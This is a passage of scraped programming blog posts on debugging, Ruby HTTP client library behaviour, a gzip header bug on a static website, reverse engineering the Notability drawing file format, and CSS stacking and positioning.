does it not happen? Then apply their mental model of the\nsystem to guess at what could be breaking and come up with experiments. \n\n Experiments could be changing or removing code, making API calls from a REPL, trying new inputs,\npoking at memory values with a debugger or print statements. \n \n\n I think the loop here may be: \n\n \n make guess about one aspect about what might be happening (“this variable is set to X where it\nshould be Y”, “the server is being sent the wrong request”, “this code is never running at all”) \n do experiment to check that guess \n repeat until you understand what’s going on \n \n\n change one thing at a time \n\n Everybody definitely agrees that it is important to change one thing a time when doing an\nexperiment to verify an assumption. \n\n check your assumptions \n\n A lot of debugging is realizing that something you were  sure  was true (“wait this request is\ngoing to the new server, right, not the old one???“) is actually… not true. I made an attempt to\n list some common incorrect assumptions . Here\nare some examples: \n\n \n this variable is set to X (“that filename is definitely right”) \n that variable’s value can’t possibly have changed between X and Y \n this code was doing the right thing before \n this function does X \n I’m editing the right file \n there can’t be any typos in that line I wrote it is just 1 line of code \n the documentation is correct \n the code I’m looking at is being executed at some point \n these two pieces of code execute sequentially and not in parallel \n the code does the same thing when compiled in debug / release mode (or with -O2 and without, or…) \n the compiler is not buggy (though this is last on purpose, the compiler is only very rarely to blame :)) \n \n\n weird methods to get information \n\n There are a lot of normal ways to do experiments to check your assumptions / guesses about what the\ncode is doing (print out variable values, use a debugger, etc). Sometimes, though, you’re in a more\ndifficult environment where you can’t print things out and don’t have access to a debugger (or it’s\ninconvenient to do those things, maybe because there are too many events). Some ways to cope: \n\n \n adding sounds on mobile : “In the\nmobile world, I live on this advice. Xcode can play a sound when you hit a breakpoint (and\ncontinue without stopping). I place them certain places in the code, and listen for buzzing Tink\nto indicate tight loops or Morse/Pop pairs to catch unbalanced events” (also  this tweet ) \n there’s a very cool talk about  using XCode to play sound for iOS debugging here \n adding LEDs : “When I did embedded\ndev ages ago on grids of transputers, we wired up an LED to an unused pin on each chip. It was\nsurprisingly effective for diagnosing parallelism issues.” \n string : “My networks prof told me\nabout a hack he saw at Xerox in the early days of Ethernet: a tap in the coax with an amp and\nmotor and piece of string. The busier the network was, the faster the string twirled.” \n peep  is a “network auralizer” that translates what’s\nhappening on your system into sounds. I spent 10 minutes trying to get it to compile and failed so\nfar but it looks very fun and I want to try it!! \n \n\n The point here is that information is the most important thing and you need to do whatever’s\nnecessary to get information. \n\n write your code so it’s easier to debug \n\n Another point a few people brought up is that you can improve your program to make it\neasier to debug. tef has a nice post about this:  Write code that’s easy to delete, and easy to debug too.  here. I thought this\nwas very true: \n\n \n Debuggable code isn’t necessarily clean, and code that’s littered with checks or error handling\nrarely makes for pleasant reading. \n \n\n I think one interpretation of “easy to debug” is “every single time there’s an error, the program\nreports to you exactly what happened in an easy to understand way”. Whenever my program has a\nproblem and says something like “error: failure to connect to SOME_IP port 443: connection timeout”\nI’m like THANK YOU THAT IS THE KIND OF THING I WANTED TO KNOW and I can check if I need to fix a\nfirewall thing or if I got the wrong IP for some reason or what. \n\n One simple example of this recently: I was making a request to a server I wrote and the\nreponse I got was “upstream connect error or disconnect/reset before headers”. This is an nginx\nerror which basically in this case boiled down to “your program crashed before it sent anything in\nresponse to the request”. Figuring out the cause of the crash was pretty easy, but having better\nerror handling (returning an error instead of crashing) would have saved me a little time\nbecause instead of having to go check the cause of the crash, I could have just read the error\nmessage and figured out what was going on right away. \n\n error messages are better than silently failing \n\n To get closer to the dream of “every single time there’s an error, the program reports\nto you exactly what happened in an easy to understand way” you also need to be disciplined about\nimmediately returning an error message instead of silently writing incorrect data / passing a\nnonsense value to another function which will do WHO KNOWS WHAT with it and cause you a gigantic\nheadache. This means adding code like this: \n\n if UNEXPECTED_THING:\n    raise \"oh no THING happened\"\n \n\n This isn’t easy to get right (it’s not always obvious where you should be raising errors!“) but it\nreally helps a lot. \n\n failure: print out a stack of errors, not just one error. \n\n Related to returning helpful errors that make it easy to debug: Rust has a really incredible error\nhandling library  called failure  which basically lets\nyou return a chain of errors instead of just one error, so you can print out a stack of errors like: \n\n \"error starting server process\" caused by\n\"error initializing logging backend\" caused by\n\"connection failure: timeout connecting to 1.2.3.4 port 1234\".\n \n\n This is SO MUCH MORE useful than just  connection failure: timeout connecting to 1.2.3.4 port 1234 \nby itself because it tells you the significance of 1.2.3.4 (it’s something to do with the logging\nbackend!). And I think it’s also more useful than  connection failure: timeout connecting to 1.2.3.4 port 1234 \nwith a stack trace, because it summarizes at a high level the parts that went wrong instead of\nmaking you read all the lines in the stack trace (some of which might not be relevant!). \n\n tools like this in other languages: \n\n \n Go: the idiom to do this seems to be to just concatenate your stack of errors together as a\nbig string so you get “error: thing one: error: thing two : error: thing three” which works okay but\nis definitely a lot less structured than  failure ’s system \n Java: I hear you can give exceptions causes but haven’t used that myself \n Python 3: you can use  raise ... from  which sets the  __cause__  attribute on the exception and then\nyour exceptions will be separated by  The above exception was the direct cause of the following\nexception:.. \n \n\n If you know how to do this in other languages I’d be interested to hear! \n\n understand what the error messages mean \n\n One sub debugging skill that I take for granted a lot of the time is understanding what error\nmessages mean! I came across this nice graphic explaining  common Python errors and what they\nmean , which breaks down\nthings like  NameError ,  IOError , etc. \n\n I think a reason interpreting error messages is hard is that understanding a new error message might\nmean learning a new concept –  NameError  can mean “Your code uses a variable outside the scope\nwhere it’s defined”, but to really understand that you need to understand what variable scope is! I\nran into this a lot when learning Rust – the Rust compiler would be like “you have a weird lifetime\nerror” and I’d like be “ugh ok Rust I get it I will go actually learn about how lifetimes work\nnow!“. \n\n And a lot of the time error messages are caused by a problem very different from the text of the\nmessage, like how “upstream connect error or disconnect/reset before headers” might mean “julia,\nyour server crashed!“. The skill of understanding what error messages mean is often not transferable\nwhen you switch to a new area (if I started writing a lot of React or something tomorrow, I would\nprobably have no idea what any of the error messages meant!). So this definitely isn’t just an issue\nfor beginner programmers. \n\n that’s all for now! \n\n I feel like the big thing I’m missing when talking about debugging skills is a stronger\nunderstanding of where people get stuck with debugging – it’s easy to say “well, you need to\nreproduce the problem, then make a more minimal reproduction, then start coming up with guesses and\nverifying them, and improve your mental model of the system, and then figure it out, then fix the\nproblem and hopefully write a test to make it not come back”, but – where are people actually\ngetting stuck in practice? What are the hardest parts? I have some sense of what the hardest parts\nusually are for me but I’m still not sure what the hardest parts usually are for someone newer to\ndebugging their code. \n\n"},
{"url": "https://jvns.ca/blog/2016/03/04/whats-up-with-ruby-http-libraries/", "title": "Surprises in Ruby HTTP libraries", "content": "\n     \n\n Hi friends! I was helping decide between some Ruby HTTP client libraries at\nwork, and I learned a couple of things that surprised me (and some decisions I didn’t agree with). \n\n I ended up doing a tiny amount of open source archaeology, with interesting results! Let’s learn some things! \n\n Ruby HTTP libraries: a taxonomy \n\n A HTTP library is conceptually a really simple thing – all HTTP is, for the most part, is you send some text to a server ( GET /awesomepage.html ), and they send you some other text back ( omg cats ). But it turns out that HTTP has a lot of features, so we have libraries that help us put together those requests and parse the responses for us. \n\n There’s  this fantastic slideshow  comparing HTTP libraries. And it has this great slide: \n\n \n\n This slide tells us that there are basically only 4 HTTP libraries in Ruby: \n\n \n Net::HTTP (built into Ruby) \n Excon \n httpclient \n variants on bindings for libcurl (a C HTTP library, that  curl  uses) \n \n\n That’s it. Every other library builds on top of those libraries. We can classify these even further! Net::HTTP, Excon, and httpclient all use Ruby’s built-in  socket  library to make TCP connections. So the real taxonomy is \n\n * Socket interface (operating system)\n  * Ruby socket library\n    * Excon\n    * Net::HTTP\n    * httpclient\n  * libcurl\n    * Ruby bindings for libcurl (curb)\n \n\n I find taxonomies like this super helpful when trying to understand a landscape of possibilities. Instead of having 15 or 20 libraries to think about, now there are just 4! \n\n I’m only going to say things about 2 libraries: Excon and Net::HTTP \n\n A surprise in Net::HTTP \n\n There’s a post on the front page of HN today about how  nginx proxies will retry HTTP requests . This is undesirable and scary because – when you make a request, often you expect it to happen just once! What if your GET request means “execute this trade”? Then it shouldn’t just get randomly retried – you want control over that! \n\n Similarly, Net::HTTP will retry your GET, HEAD, PUT, DELETE, OPTIONS, and TRACE requests. As far as I can tell, you cannot turn this off.  Here’s the code that does it . \n\n the code snippet: \n\n if count == 0 && IDEMPOTENT_METHODS_.include?(req.method)\n  count += 1\n  @socket.close if @socket and not @socket.closed?\n  D \"Conn close because of error #{exception}, and retry\"\n  retry\nend\n \n\n I was really surprised and kind of taken aback to learn this. I wanted to find out why it was this say, so I found  the issue in the Ruby bug tracker that introduced this behavior! . It turns out that this retry feature was added to Ruby in 2012! And it was added because the RFC for HTTP/1.1  recommends that HTTP clients act this way . \n\n \n Client software SHOULD reopen the transport connection and retransmit the aborted sequence of requests without user interaction so long as the request sequence is idempotent (see section 9.1.2). \n \n\n Huh. This is (as you would see if I linked to a comment thread on the nginx blog\npost) a controversial choice – it makes a lot of sense for a web browser to\nretry, and perhaps less sense for a library you’re calling from your code to\nautomatically retry, without the ability configure it. \n\n A surprise in Excon \n\n A while ago, I wrote  Why you should understand (a little) about TCP , where I had Mysterious Slow HTTP Requests that were slow for no reason. This was because of Excon! When you make a HTTP request with a body (like a POST request) with Excon, it does the equivalent of \n\n socket.write(headers)\nsocket.write(body)\n \n\n Here’s the code. \n\n This ends up creating 2 TCP packets for the request, and can cause your packets to be delayed (as I talk about in that TCP post). This is no good! \n\n I looked into the history of this in Excon.  There’s an Github issue referencing Nagle’s algorithm and this exact performance problem from 2013 , and it appears to have been fixed, and then reverted to the old behavior again in  this issue , because they had problems doing string concatenation. So it seems like the library’s authors understood the choice they were making, but just didn’t have time to address it. \n\n Update:  this is now fixed in Excon, as of release v0.48.0 on March 7, 2016. ( pull request ). Yay! \n\n How do we find surprises? (or: reviewing a library) \n\n The scariest thing about introducing dependencies to me is – how do I know if it will surprise me unpleasantly a year from now, in production? \n\n I haven’t done this very much, and I’d like to get better at it. I have a couple of thoughts to start. \n\n First, Net::HTTP is maybe 2000 lines of code, not including comments. It has ~1000 lines of comments.  The code’s right here. . A lot of it is wrapper methods! At work, I’d consider a 2000-line pull request somewhat arduous to review, but perhaps not totally outside the bounds of reasonableness! I can read 2000 lines of code, mostly! \n\n So I tried. I found that  Net::HTTP always sets TCP_NODELAY  and that  it’s careful to use a monotonic clock when checking for timeouts . The first one is surprising to me! I would expect that to be configurable too. I did not try too hard to read Excon’s code because at this point it was way after midnight. \n\n The second idea I had for understanding some code is – try to think of all the situations I might want to run the code in, and strace all those situations! Then I could see if it ran the system calls I expect. \n\n I am still Very Inexperienced at reviewing dependencies like this. Something which isn’t like 2000 lines of code would be way harder to try to review! But it occurs to me that security people audit code regularly, and so reading libraries to understand what they do and if they’re safe to use is perhaps not totally abnormal. \n\n open source! \n\n It turns out that open source projects are just like all software projects – they do unexpected stuff, and then when I go find out why a person decided to do that I’m usually like “oh, I see why you made that decision!” Even if I don’t agree. \n\n When I run into code that does stuff I don’t agree with, I’m reminded of this great paragraph from  On Being a Senior Engineer  – \n\n \n Critique code instead of people – be kind to the coder, not to the code. As much as possible, make all of your comments positive and oriented to improving the code. Relate comments to local standards, program specs, increased performance, etc. \n \n\n"},
{"url": "https://jvns.ca/blog/2017/05/10/a-small-website-bug-story/", "title": "A small website mystery", "content": "\n     \n\n Hello! For half of today, my website was broken! I like debugging\nstories, so I thought I’d tell this one. Someone  tweeted at me  this morning\nsaying “hey your website has an issue”. They very kindly sent me a\nscreenshot: \n\n \n \n \n \n \n\n Yep. That looks like an issue to me! I asked them to run  curl -i\nhttp://jvns.ca  and they sent me  the output . \n\n Let’s take a look at the HTTP headers. \n\n HTTP/1.1 200 OK\nDate: Wed, 10 May 2017 13:12:18 GMT\nTransfer-Encoding: chunked\nConnection: keep-alive\nSet-Cookie: __cfduid=d79dd5269ee9d191c6eb32a5ab5277a391494421938;\nexpires=Thu, 10-May-18 13:12:18 GMT; path=/; domain=.jvns.ca; HttpOnly\nETag: W/\"3715-54e836f53861d-gzip\"\nVary: Accept-Encoding\nCF-Cache-Status: HIT\nExpires: Thu, 11 May 2017 13:12:18 GMT\nCache-Control: public, max-age=86400\nX-Content-Type-Options: nosniff\nServer: cloudflare-nginx\nCF-RAY: 35cd2639b2c36920-CDG\n \n\n why are these HTTP headers wrong? \n\n There are two things to notice here: first, it says  ETag:\nW/\"3715-54e836f53861d-gzip\" . This is a great clue. I was like “oh, is\nit gibberish because it’s gzipped??” \n\n How do you check if a file is gzipped? The easiest way is probably to\ntry to unzip it and see if it works. In this case the gzipped data was in the same file as the headers\nthough, so I ran  hexdump -c file.txt . I looked at the bytes at the\nbeginning of the binary data and it said  1f 8b . I  happen to know  that those are the 2 bytes every gzip stream starts with! \n\n So, it was gzipped. That’s fine though, browsers can handle gzipped\ndata! The second thing to notice is, well, something that isn’t there.\nWhen a site sends gzipped data, it’s meant to send a  Content-Encoding:\ngzip  header to say “hey, this content is gzipped, unzip it before\ndisplaying it!” So we have our first mystery! \n\n mystery 1: why is the Content-Encoding: gzip header missing? \n\n What happened to the Content-Encoding: gzip header? \n\n I tried running  curl -I http://jvns.nfshost.com  (which is the backend\nfor my webhost,  https://jvns.ca  uses Cloudflare) to look at the HTTP headers. It was returning a\n Content-Encoding: gzip  header! Here are the headers: \n\n HTTP/1.1 200 OK\nDate: Thu, 11 May 2017 01:51:56 GMT\nServer: Apache\nUpgrade: h2c\nConnection: Upgrade\nLast-Modified: Tue, 02 May 2017 05:01:38 GMT\nETag: \"1fcdd-54e836f527c7c\"\nAccept-Ranges: bytes\nAge: 118\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 14327\nContent-Type: text/html; charset=UTF-8\n \n\n This is also weird though! You might say – “okay, it says\nContent-Encoding: gzip, that’s good”. But normally in order to get\ngzipped content, you have to send an  Accept-Encoding: gzip  header to\nsay “I understand gzip!”. But I wasn’t sending that header with curl, and my site\nwas returning gzipped content anyway. Weird, right? \n\n So we haven’t solved our mystery, but we’ve found a SECOND mystery: \n\n mystery 2: why does my site send gzipped content even when I didn’t ask it to?? \n\n the secret of the surprise gzipped content \n\n I could think of an answer to the second mystery, though! A few years\nago, I felt like I was spending too much money on bandwidth, and I\nwanted to save some money. I have a static site, so I gzipped every page\non my site, and set up this Apache configuration: \n\n RewriteEngine on \nRewriteCond %{HTTP:Accept-Encoding} gzip \nRewriteCond %{REQUEST_FILENAME}.gz -f \nRewriteRule ^(.*)$ $1.gz [L] \n \n\n This tells Apache “hey, always send gzipped replies no matter what!!”.\nSo we’ve solved Mystery 2 – I deleted that  .htaccess  file, and\njvns.nfshost.com started behaving normally again. \n\n Today my web host (nearlyfreespeech, which I like a lot) will\nautomatically gzip content when asked to, but it didn’t in the past!\n( here’s the post announcing it ) \n\n Also, when I cleared my Cloudflare cache my site started behaving\nnormally again, which I think means the problem is fixed. Maybe my weird\nApache rule’s aberrant behavior was causing Cloudflare to break somehow? Not clear! \n\n why did it take me half a day to fix it? \n\n Normally if something is wrong with the Cloudflare version of my site\nbut the non-CDN version of my site seems ok, I could just turn off\nCloudflare for a bit to see if that fixes it. Hilariously, I turned on\n Strict-Transport-Security \nlast week, which means my site only works if it’s served over HTTPS. And\nmy normal webhost isn’t set up with HTTPS yet, so I can’t just turn off\nCloudflare. That’s ok though, if a few pages on this blog are broken for\na few hours the world won’t end. \n\n What happened to the Content-Encoding: gzip header though? \n\n I still don’t know where the Content-Encoding: gzip header went! Did\nCloudflare remove it? Did my webhost stop serving it for some reason? I\nhave no idea! Anyway, my site seems to work again (I think/hope?) and I\nthought this was kind of a fun excursion into HTTP headers. \n\n"},
{"url": "https://jvns.ca/blog/2018/03/31/reverse-engineering-notability-format/", "title": "Reverse engineering the Notability file format", "content": "\n     \n\n I spend a fair amount of time drawing comics about programming. (I have a  new zine called “profiling & tracing with perf” !\nEarly access is $10, if you want to read it today!) \n\n So on Thursday, I bought an iPad + Apple Pencil, because the Apple Pencil is a very nice tool for\ndrawing.  I started using the Notability app for iPad, which seems pretty nice. But I had a problem:\nI have dozens of drawings already in the Android app I was using: Squid! \n\n Notability  does  have a way to import PDFs, but they become read-only – you can draw on top of\nthem, but you can’t edit them. That’s annoying! \n\n Here’s the rough dialog that ensued: \n\n \n Julia: “I want to convert my old drawings to the new app but there’s no way to do it!!” \n Kamal: “well what if you reverse engineered the Notability file format?” \n Julia: “hmm that sounds like it would take a long time” \n Kamal: “maybe just spend an hour on it and see what happens!” \n Julia: “okay!!!!!” \n \n\n So! The plan was to figure out how to convert SVGs to Notability’s native format ( .note ). This is\na proprietary format, and nobody else seemed to have reverse engineered it yet, so I started from\nscratch. \n\n If you want to use my terrible code to convert SVGs to Notability, here’s the github repo:  svg2notability . It comes out to less than 200 lines of Python. \n\n I thought I’d write up the process of reverse engineering this file format because it wasn’t really\nTHAT hard, and reverse engineering often seems kind of unapproachable and scary. I started doing\nthis yesterday, and as of this evening I have something that works well enough for me to start using it. \n\n In this post, I’ll explain how I figured out how this Notability  .note  format works! \n\n step 0: start with a  .note  file \n\n I exported a  .note  file from the app, put it in Dropbox, and copied it to my Linux computer. Easy.\nIt’s called  template.note . \n\n step 1: unzip the file \n\n What’s a  .note  file? Well, the way we figure out what files are is we run  file  on them! Turns\nout it’s a zip file: \n\n $ file template.note \ntemplate.note: Zip archive data, at least v2.0 to extract\n$ unzip template.note\n \n\n That decompresses into a directory called  template/ . Here are the files in it: \n\n $ find template/\ntemplate/\ntemplate/thumbnail\ntemplate/Assets\ntemplate/Session.plist\ntemplate/thumb3x.png\ntemplate/Recordings\ntemplate/Recordings/library.plist\ntemplate/thumb2x.png\ntemplate/thumbnail2x\ntemplate/metadata.plist\ntemplate/Images\ntemplate/thumb6x.png\ntemplate/thumb.png\n \n\n Okay, neat! What’s a  .plist  file? \n\n step 2: decode the  .plist  file \n\n Google (and  file ) tell us that a  .plist  file is some kind of Apple format. Okay! Google says\nthat there’s both an XML format, and a binary format. This one is the binary format. \n\n $ file template/Session.plist \ntemplate/Session.plist: Apple binary property list\n \n\n I’m temporarily worried by this, but some more Googling reveals that there’s a Linux utility\ncalled  plistutil  that I can use to translate between them.  sudo apt install plistutil  gets me\nthe utility! \n\n I convert all the binary  .plist  files to XML, look at them, and it becomes clear that\n template/Session.plist  is the file with the drawing data. You can see what it looks like here once\nit’s decoded as XML:  notability_session.xml . \n\n How could you tell that it was where the drawing data was, Julia? Well, it had these very temptingly\nnamed fields like “curvespoints”. Like this: \n\n <key>curvespoints</key>\n<data>\nmgG+QjOrB0NmuUBDVT3MQgA5kUNEJIlCTBXCQ2YWDEIAT7JCM4tqQ+YFUEMzGVlDJnKj\nQzOnR0Na4d5DMzU2QzMzukKafLZDM5dZQ2aDrkNmCqtDM4qmQzNJ6UMAkZ5DZpadQjPQ\nA0SFx51CsM4DRHjvnUI7zQNEsRCeQrTLA0QiU55CpsgDRKl6nkJUxQNEzZqeQs3AA0Sv\nrp5CEr8DRHW3nkIdvQNEM82eQma4A0RNHJ9CrqkDRNV2n0KUmANEmtGfQs2IA0QoPqBC\np3UDRJugoEINZQNEANagQs1eA0SKIaFCC1QDREOEoULIRgNEzQyiQoA1A0TpVKJCUSsD\nROCWokKvIgNEzcmiQrMdA0SVk6NCtAgDRH10pEJr9gJEzZOlQmbfAkTyaadCkrUCRFb8\nqUKYewJEmjCtQmY+AkTkaLBCSQICRKEqtEIkyAFEAPi3QjOSAUS+RbtCMGMBRK6lvkKk\nMwFEANDBQmYDAURBQMZCHb0ARCxqykKSdgBEzQDPQrMwAET6vtNCwdL/Q34M2UJwPv9D\nmT7eQpm6/kNsXuNCcjr+QzQE6EIV2f1DM7vsQjNi/UMSDu9C6CT9Qztz8UIY4fxDmRD0\nQpmY/EMwL/ZC3F/8Q0Fu+EKoJPxDM8L6Qmbl+0N9tf1Ck5P7Q6JnAENsOvtDmu4BQ5nf\n+kOgxgJDQK36Q0OWA0MCe/pDmmQEQ5lF+kNbgQVDQ/v5Q6yaBkMkr/lDZr0HQzNk+UPB\n...\n</data>\n \n\n One might think this “curvespoints” data represents… the  points  on the  curves  in the file.\nSpoiler: it does. \n\n step 3: decoding the points on the curve \n\n This is going to sound pretty straightforward but in real life I was more confused and complained more. Here’s how I decoded what this “curvespoints” thing was \n\n \n Realize it’s base 64 encoded. This part was easy: I’ve worked with base64 encoded data before,\nand it’s how binary data is often encoded in a text file. Cool. \n Look at the data in hexdump \n Be confused (“this just random bytes?!!? how can I know what this means??”) \n Try to see if it’s msgback (no), bencode (no). Be confused. Complain. Repeat for an hour or so. \n Finally think “wait, what if it’s just an array of 32-bit floats????? That would be simple and it\nwould make sense!!” \n Try to decode it as an array of 32 bit floats \n It just works \n \n\n Here’s the Python code I used to decode it as an array of 32 bit floats. It turns out that core\nPython has a  built in module  for parsing plist files (?!!?). So that was useful. \n\n import subprocess\nimport plistlib\nimport struct \n\ndef unpack_struct(string, fmt):\n    return struct.unpack('{num}{format}'.format(num=len(string)/4, format=fmt), string)\n\nplistlib.readPlistFromString(subprocess.check_output(['plistutil', '-i', 'file.plist']))\ncurves_points = pl['$objects'][8]['curvespoints'].data\nunpack_struct(curvespoints, 'f')\n \n\n Here are some of the floats that came out of my file. These look pretty clearly like points on a\ncurve: it’s an array of floats, and each group of 2 consecutive floats is a point on the curve.\nNeat!! \n\n (407.59869384765625,\n 396.6827087402344,\n 408.05926513671875,\n 396.3546447753906,\n 408.2127990722656,\n 396.2452697753906,\n 408.3787536621094,\n 396.1249084472656,\n 408.55938720703125,\n 395.9921875)\n \n\n step 4: decode everything else \n\n Decoding the other bits was pretty straightforward: there’s \n\n \n curvesnumpoints : array of 32 bit integers, which is the number of points on each curve ( unpack_struct(curves['curvesnumpoints'].data, 'i') ), \n curveswidth : array of 32 bit floats, thickness of each curve \n curvescolors : array of 32-bit RGBA values ( 0x00FFEEFF  is the hex code  #00FFEE , the last bit\nis the opacity) \n curvesfractionalwidths : multiplier of width for variable length curves. I didn’t care about these, I set all of them\nto 1.0. \n eventTokens : not sure, I just set all of these to the float  1.0  and it seemed to work fine \n \n\n step 5:  plot the points on a graph!! \n\n To make sure that the points actually  were  points, I plotted them on a graph!!! In this example\nI was actually using an image from a zine idea I had about working with your manager. Here’s what it looked like: \n\n \n\n So cool!!!! I was extremely jazzed about my success. Also it was 5pm and time to go for dinner at a\nfriend’s house, so I did that. \n\n step 5: generate the  .note  file \n\n Okay, now we have some belief that we know how this file format works. How can we generate files of\nthis format? \n\n The basic game plan was: \n\n \n start with an existing empty  .note  file. \n Keep everything about it the same except the  Session.plist  file, where the drawing data is. \n Change the  curvesnumpoints ,  curveswidth ,  curvescolors , etc data \n Zip it back up, import it into my app, and hope it works!!! \n \n\n One debugging tactic that helped me along the way: I tried to regenerate an  existing  .plist file that I already had. I got the\nlist of points that I thought it represented, and generated the  curvesnumpoints , etc fields myself\nand made sure they matched up with the real data that Notability had for those files. Then I turned\nthat into a unit test! \n\n There were a bunch of weird artifacts and bugs along the way, but this blog post is already pretty\nlong and I don’t think it’s interesting to explain this. \n\n the results \n\n Here are the results! First, here’s what the SVG that I input into my svg2notability program looks\nlike: \n\n \n \n \n\n And here it is in Notability, after I converted it! It looks basically the same! And I can easily\nedit it, which was the point. The colours worked and everything! \n\n \n \n \n\n what doesn’t work \n\n things I didn’t get to work (though presumably I could if I wanted to spend more time): \n\n \n generating documents with multiple pages (didn’t try) \n drawing squares – some of my drawings have perfect squares in them and there’s a bug with them\nthat I haven’t worked out yet \n changing the paper size in Notability to match the original paper size. Instead I just scale the\nwidth to match Notability’s default paper width, which is very hacky but may be good enough. \n \n\n there are only so many file formats \n\n I think the thing that makes reverse engineering not that hard is – developers reuse code! People\ndon’t usually invent totally custom file formats! Nothing in here was really complicated – it was\njust some existing standard formats (zip! apple plist! an array of floats!) combined together in a\npretty simple way. \n\n that’s all! \n\n It’s really fun to start with a seemingly intractable or very manual task, think “wait, I’m a\nprogrammer!!” and manage to use the power of programming to (at least sort of) do what I want! \n\n I do find it kind of frustrating that all these mobile drawing apps (Squid, Notability, Goodnotes,\netc) use proprietary file formats and you can’t convert between them without reverse engineering.\nBut reverse engineering is possible!!  squid_decoder \nreverse engineered the Squid format (it’s basically a google protocol buffer) \n\n If you want to read the code for some reason it’s at  https://github.com/jvns/svg2notability . \n\n"},
{"url": "https://jvns.ca/blog/debugging-attitude-matters/", "title": "When debugging, your attitude matters", "content": "\n     \n\n A while back I wrote  What does debugging a program look like?  on what to do when debugging (change one thing at a time! check your assumptions!). \n\n But I was debugging some CSS last week, and I think that post is missing\nsomething important:  your attitude . \n\n Now – I’m not a very good CSS developer yet. I’ve never written CSS\nprofessionally and I don’t understand a lot of basic CSS concepts (I think I\nfinally understood for the first time recently how  position: absolute  works). And last\nweek I was working on the most complicated CSS project I’d ever attempted. \n\n While I was debugging my CSS, I noticed myself doing some bad things that I\nnormally would not! I was: \n\n \n making random changes to my code in the hopes that it would work \n googling a lot of things and trying them without understanding what they did \n if something broke, reverting my changes and starting again \n \n\n This strategy was exactly as effective as you might imagine (not very\neffective!), and it was because of my attitude about CSS! I had this\nunusual-for-me belief that CSS was Too Hard and impossible for me to\nunderstand. So let’s talk about that attitude a bit! \n\n the problem attitude: “this is too hard for me to understand” \n\n One specific problem I was having was – I had 2 divs stacked on top of one another, and\nI wanted Div A to be on top of Div B.  My model of CSS stacking order at the\nstart of this was basically “if you want Thing A to be on top of Thing B,\nchange the z-index to make it work”. So I changed the z-index of Div A to be 5\nor something. \n\n But it didn’t work! In Firefox, div A was on top, but in Chrome, Div B was on\ntop. Argh! Why? CSS is impossible!!! ( if you want to see the exact actual situation I was in, I  reproduced the different-in-firefox-and-chrome thing here after the fact ) \n\n I googled a bit, and I found out that a possible reason z-index might not work\nwas because Div A and Div B were actually in different “stacking contexts”. If\nthat was true, even if I set the z-index of Div A to 999999 it would still not\nput it on top of Div B. ( here’s a small example of what this z-index problem looks like, though I think my specific bug had some extra complications ) \n\n I thought “man, this stacking context thing seems really complicated, why is it\ndifferent between Firefox and Chrome, I’m not going to be able to figure this\nout”. So I tried a bunch of random things a bunch of blog posts suggested,\nwhich as usual did not work. \n\n Finally I gave up this “change random things and pray” strategy and thought “well, what\nif I just read the documentation on stacking order, maybe it’s not that bad”. \n\n So I read the  MDN page on stacking order , which says: \n\n \n When the z-index property is not specified on any element, elements are stacked in the following order (from bottom to top):  \n1. The background and borders of the root element  \n2. Descendant non-positioned blocks, in order of appearance in the HTML  \n3. Descendant positioned elements, in order of appearance in the HTML \n \n\n This is SO SIMPLE! It just depends on the order in the HTML! I put Div A after\nDiv B in the HTML (as a sibling) and it made everything work in both browsers. \n\n better attitude: “let’s learn the basics and see if that helps” \n\n This whole stacking problem turned out to really not be that complicated – all I\nneeded to do was read a very short and simple documentation page to understand how stacking works! \n\n Of course, computer things are not always this simple (and even in this\nspecific case the  rules about what creates a new stacking\ncontext \nare pretty complicated.). But I did not need to understand those more complicated rules in order to put Div A on top of Div B! I only needed to know the much simpler 3 rules above. \n\n So – calm down for a second, learn a few of the basics, and see if that helps. \n\n watching people who know what they’re doing is inspiring \n\n Another area of CSS that I thought was “too hard” for me to understand was this\nwhole  position: absolute  and  position: relative  business.  I kept seeing\n(and sometimes using!) examples where people made complicated CSS things with\n position: absolute  but I didn’t understand how they worked. Doesn’t  position: absolute  mean that the element is always in the same place on the screen? Why are these  position: absolute  things moving when I scroll like the rest of the document? (spoiler: no, that’s  position: fixed .) \n\n But last week, I paired with someone who’s a lot better at CSS than me on some\ncode, and I saw that they were just typing in  position: absolute  and\n position: relative  confidently into their code without seeming confused about\nit!! Could that be me? \n\n I looked up the  documentation on MDN  on  position: absolute , and it said: \n\n \n The element is removed from the normal document flow, and no space is created\nfor the element in the page layout. It is positioned relative to its closest\npositioned ancestor… Its final position is determined by the values of top, right, bottom, and left. \n \n\n So things with  position: absolute  are positioned relative to their closest\npositioned ancestor! And you just use  top/bottom/right/left  to pick where!\nThat’s so simple! \n\n documentation that you can trust makes a big difference \n\n I think another big source of my frustration with CSS is that I didn’t have the\nbest grasp of where to find accurate information & advice. I knew that MDN was a reliable\nreference, but MDN doesn’t really help answer questions like “ok but seriously\nhow do I center a div???” and I found myself reading a lot of random Stack Overflow\nanswers/blog posts that I wasn’t 100% sure were correct. \n\n This week I learned about  CSS Tricks  which has a lot\nof GREAT articles like  Centering in CSS: A Complete Guide  which seems very reputable and is written\nin a super clear way. \n\n that’s all! \n\n I don’t really know why I started to believe that it was “impossible” to\nunderstand basic CSS concepts since I don’t believe that about computers in\ngeneral. Maybe because I’ve been writing CSS at a beginner level for a very\nlong time but hadn’t ever really tried to do a more involved CSS project than\n“let’s arrange some divs in a grid with flexbox”! \n\n But this attitude really got in the way of me writing the CSS I wanted to\nwrite!  And once I let go of it and used my normal debugging techniques I was\nable to get a lot more things to work the way I wanted. \n\n"},
{"url": "https://jvns.ca/blog/2015/11/22/how-i-got-better-at-debugging/", "title": "How I got better at debugging", "content": "\n      I had a performance review last week where I was told, among other things, that I’m very good at debugging, especially difficult & confusing problems. I thought about this and I was like YEAH I AM. But I didn’t used to be. What happened?! \n\n I sometimes hear advice to be extremely systematic and organized. I think that’s good advice and I told my partner this and he laughed because I am not the most systematic and organized person. But here are some things that I think have helped me anyway: \n\n Remember that the bug is happening for a logical reason \n\n Sometimes when I hit a bug, especially a nondeterministic and difficult to reproduce bug, it’s tempting to think “oh you know, things just happen, who knows”. But everything on a computer does in fact happen for a logical reason (however much the computer may try to convince you otherwise). Reminding myself of that helps me fix bugs. Also known as “OK JULIA IT IS NOT FAIRIES WHAT ACTUAL REASON COULD BE CAUSING THIS?” \n\n Be unreasonably confident in my ability to fix the bug \n\n I recently dealt with a performance problem in a job at work that took me 3 weeks to fix (see  a millisecond isn’t fast ). If I hadn’t been able to fix it, I would have felt pretty bad and like it was a waste of 3 weeks. \n\n But we were processing a relatively small number of records, and it was taking 15 hours to do it, and it was NOT REASONABLE and I knew that the job was too slow. And I figured it out, and now it’s faster and everyone is 